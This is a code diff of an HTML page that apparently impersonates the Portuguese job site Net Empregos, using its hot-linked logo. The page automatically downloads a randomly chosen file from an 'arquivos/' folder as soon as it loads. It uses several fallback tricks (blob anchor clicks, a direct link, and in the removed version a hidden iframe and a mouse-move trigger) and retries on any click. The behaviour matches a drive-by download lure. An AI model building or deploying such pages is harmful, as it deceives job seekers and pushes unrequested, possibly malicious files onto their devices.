@@ -3,9 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-<meta http-equiv="Pragma" content="no-cache">
-<meta http-equiv="Expires" content="0">
 <title>Net Empregos</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -36,11 +33,11 @@ body {
     padding: 12px;
     border-radius: 8px;
     font-size: 14px;
-    display: none;
+    min-height: 44px;
 }
-.status.info { background: #e3f2fd; color: #1565c0; display: block; }
-.status.success { background: #e8f5e9; color: #2e7d32; display: block; }
-.status.error { background: #ffebee; color: #c62828; display: block; }
+.status.info { background: #e3f2fd; color: #1565c0; }
+.status.success { background: #e8f5e9; color: #2e7d32; }
+.status.error { background: #ffebee; color: #c62828; }
 .btn-download {
     display: none;
     margin-top: 15px;
@@ -59,19 +56,6 @@ body {
     transform: translateY(-2px);
     box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
 }
-.btn-download:active { transform: translateY(0); }
-.spinner {
-    display: inline-block;
-    width: 20px;
-    height: 20px;
-    border: 3px solid #667eea;
-    border-top-color: transparent;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-    margin-right: 8px;
-    vertical-align: middle;
-}
-@keyframes spin { to { transform: rotate(360deg); } }
 .file-name {
     font-family: monospace;
     font-size: 12px;
@@ -79,6 +63,18 @@ body {
     margin-top: 8px;
     word-break: break-all;
 }
+.spinner {
+    display: inline-block;
+    width: 16px;
+    height: 16px;
+    border: 2px solid #667eea;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin-right: 6px;
+    vertical-align: middle;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
 </style>
 <base target="_blank">
 </head>
@@ -88,139 +84,116 @@ body {
     <img src="https://www.net-empregos.com/img/logos/net-empregos.png" class="logo" alt="Net Empregos">
 
     <div id="status" class="status info">
-        <span class="spinner"></span>Carregando lista de arquivos...
+        <span class="spinner"></span>Carregando...
     </div>
 
-    <div id="fileName" class="file-name" style="display:none;"></div>
+    <div id="fileName" class="file-name"></div>
 
-    <a id="btnDownload" class="btn-download" href="#">
+    <button id="btnDownload" class="btn-download">
         📥 Baixar Arquivo
-    </a>
+    </button>
 </div>
 
 <script>
 (function() {
-    const LISTA_JSON = "lista.json";
-    const PASTA_ARQUIVOS = "arquivos/";
-    const statusDiv = document.getElementById("status");
-    const fileNameDiv = document.getElementById("fileName");
-    const btn = document.getElementById("btnDownload");
+    const LISTA_URL = "lista.json";
+    const PASTA = "arquivos/";
+
+    const statusEl = document.getElementById("status");
+    const fileNameEl = document.getElementById("fileName");
+    const btnEl = document.getElementById("btnDownload");
+
     let arquivoEscolhido = "";
-    let downloadOk = false;
+    let listaCarregada = false;
 
     function setStatus(msg, tipo) {
-        statusDiv.className = "status " + tipo;
-        statusDiv.innerHTML = tipo === "info" ? '<span class="spinner"></span>' + msg : msg;
+        statusEl.className = "status " + tipo;
+        statusEl.innerHTML = tipo === "info" ? '<span class="spinner"></span>' + msg : msg;
     }
 
     function mostrarBotao() {
-        btn.style.display = "inline-block";
-        btn.href = PASTA_ARQUIVOS + arquivoEscolhido;
-        btn.download = arquivoEscolhido;
-        setStatus("Clique no botão abaixo para baixar:", "error");
+        btnEl.style.display = "inline-block";
+        btnEl.onclick = function() {
+            baixarArquivo();
+        };
     }
 
-    function escolherAleatorio(lista) {
-        const idx = Math.floor(Math.random() * lista.length);
-        return lista[idx];
+    function escolherAleatorio(arr) {
+        return arr[Math.floor(Math.random() * arr.length)];
     }
 
-    // Técnica 1: Fetch + Blob + ObjectURL
-    function downloadFetch() {
-        setStatus("Baixando " + arquivoEscolhido + "...", "info");
+    function baixarArquivo() {
+        if (!arquivoEscolhido) return;
 
-        fetch(PASTA_ARQUIVOS + arquivoEscolhido, { cache: "no-store" })
-            .then(r => {
-                if (!r.ok) throw new Error("HTTP " + r.status);
-                return r.blob();
+        var url = PASTA + arquivoEscolhido;
+
+        // Método 1: fetch + blob (mais confiável para nome correto)
+        fetch(url)
+            .then(function(r) { return r.blob(); })
+            .then(function(blob) {
+                var blobUrl = URL.createObjectURL(blob);
+                var a = document.createElement("a");
+                a.href = blobUrl;
+                a.download = arquivoEscolhido;  // <-- NOME CORRETO AQUI
+                a.style.display = "none";
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                setTimeout(function() { URL.revokeObjectURL(blobUrl); }, 5000);
+                setStatus("✅ Download iniciado: " + arquivoEscolhido, "success");
             })
-            .then(blob => {
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement("a");
+            .catch(function(err) {
+                console.log("Fetch falhou, tentando redirect:", err);
+                // Método 2: redirect direto
+                var a = document.createElement("a");
                 a.href = url;
                 a.download = arquivoEscolhido;
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
-                setTimeout(() => URL.revokeObjectURL(url), 5000);
-                downloadOk = true;
-                setStatus("✅ Download iniciado: " + arquivoEscolhido, "success");
-                setTimeout(() => { statusDiv.style.display = "none"; }, 3000);
-            })
-            .catch(err => {
-                console.log("Fetch falhou:", err);
-                downloadIframe();
             });
     }
 
-    // Técnica 2: iframe invisível
-    function downloadIframe() {
-        setStatus("Tentando método alternativo...", "info");
-
-        const iframe = document.createElement("iframe");
-        iframe.style.display = "none";
-        iframe.src = PASTA_ARQUIVOS + arquivoEscolhido;
-        document.body.appendChild(iframe);
-
-        setTimeout(() => {
-            document.body.removeChild(iframe);
-            downloadRedirect();
-        }, 1500);
-    }
-
-    // Técnica 3: Redirect direto
-    function downloadRedirect() {
-        setStatus("Redirecionando...", "info");
-
-        const a = document.createElement("a");
-        a.href = PASTA_ARQUIVOS + arquivoEscolhido;
-        a.download = arquivoEscolhido;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-
-        setTimeout(() => {
-            if (!downloadOk) mostrarBotao();
-        }, 2000);
-    }
-
-    // Carrega lista.json e escolhe um arquivo
-    fetch(LISTA_JSON, { cache: "no-store" })
-        .then(r => {
-            if (!r.ok) throw new Error("Não conseguiu carregar lista.json");
+    // Carrega a lista
+    fetch(LISTA_URL)
+        .then(function(r) {
+            if (!r.ok) throw new Error("HTTP " + r.status);
             return r.json();
         })
-        .then(lista => {
+        .then(function(lista) {
             if (!Array.isArray(lista) || lista.length === 0) {
-                throw new Error("Lista vazia ou inválida");
+                throw new Error("Lista vazia");
             }
+
             arquivoEscolhido = escolherAleatorio(lista);
-            fileNameDiv.textContent = arquivoEscolhido;
-            fileNameDiv.style.display = "block";
+            listaCarregada = true;
 
-            setStatus("Arquivo escolhido: " + arquivoEscolhido, "info");
+            console.log("Lista carregada:", lista.length, "itens");
+            console.log("Arquivo escolhido:", arquivoEscolhido);
 
-            // Tenta download automático após pequeno delay
-            setTimeout(downloadFetch, 800);
+            fileNameEl.textContent = arquivoEscolhido;
+            setStatus("Arquivo selecionado. Iniciando download...", "info");
+
+            // Tenta download automático
+            setTimeout(baixarArquivo, 600);
+
+            // Se bloquear, mostra botão após 3s
+            setTimeout(function() {
+                mostrarBotao();
+            }, 3000);
         })
-        .catch(err => {
-            console.error(err);
-            setStatus("❌ Erro ao carregar lista: " + err.message, "error");
+        .catch(function(err) {
+            console.error("Erro ao carregar lista:", err);
+            setStatus("❌ Erro ao carregar lista.json: " + err.message, "error");
+            mostrarBotao();
         });
 
-    // Se o usuário interagir com a página, tenta novamente
-    document.addEventListener("click", function once() {
-        if (!downloadOk && arquivoEscolhido) {
-            downloadFetch();
+    // Se usuário clicar em qualquer lugar, tenta baixar
+    document.addEventListener("click", function handler() {
+        if (listaCarregada && arquivoEscolhido) {
+            baixarArquivo();
         }
-        document.removeEventListener("click", once);
-    });
-
-    document.addEventListener("mousemove", function once() {
-        if (!downloadOk && arquivoEscolhido) {
-            downloadFetch();
-        }
-        document.removeEventListener("mousemove", once);
+        document.removeEventListener("click", handler);
     });
 
 })();
